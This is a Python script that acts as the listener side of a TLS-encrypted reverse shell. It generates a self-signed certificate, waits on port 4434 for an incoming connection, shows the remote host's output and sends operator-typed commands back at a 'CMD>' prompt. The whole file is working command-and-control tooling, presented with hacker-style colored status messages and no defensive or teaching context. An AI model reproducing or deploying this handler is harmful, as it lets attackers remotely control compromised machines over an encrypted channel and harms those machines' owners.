import os
import ssl
import socket
import subprocess
import random
from colorama import Fore, Style, init

init()

CERT_FILE = "reception.pem"
KEY_FILE = "reception.key"

def generate_certificate(cert_file, key_file):
    if os.path.exists(cert_file) and os.path.exists(key_file):
        print(f"{Fore.GREEN}[✓] Certificate and key already exist.{Style.RESET_ALL}")
        return

    print(f"{Fore.YELLOW}[!] Generating self-signed certificate...{Style.RESET_ALL}")
    process = subprocess.Popen([
        "openssl", "req", "-new", "-newkey", "rsa:2048", "-days", "365", "-nodes",
        "-x509", "-subj", "/CN=www.reception.recep",
        "-keyout", key_file, "-out", cert_file
    ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    for line in iter(process.stdout.readline, b''):
        try:
            colored_line = ''.join(
                random.choice([
                    Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN
                ]) + chr(c) for c in line if c != 10
            )
            print(colored_line + Style.RESET_ALL)
        except Exception:
            pass

    process.stdout.close()
    process.wait()
    print(f"{Fore.GREEN}[+] Certificate generated: {cert_file}, {key_file}{Style.RESET_ALL}")

def main():
    generate_certificate(CERT_FILE, KEY_FILE)

    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', 4434))
        sock.listen(5)
        print(f"{Fore.CYAN}[*] Listening on port 4434 (TLS 1.2)...{Style.RESET_ALL}")

        conn, addr = sock.accept()
        print(f"{Fore.GREEN}[+] TCP connection from {addr}{Style.RESET_ALL}")

        with context.wrap_socket(conn, server_side=True) as ssock:
            print(f"{Fore.CYAN}[*] TLS handshake completed.{Style.RESET_ALL}")
            while True:
                data = ssock.recv(4096)
                if not data:
                    break
                print(data.decode(errors='ignore'), end="")
                try:
                    cmd = input("CMD> ")
                    ssock.send(cmd.encode() + b"\n")
                except Exception as e:
                    print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
                    break

if __name__ == "__main__":
    main()
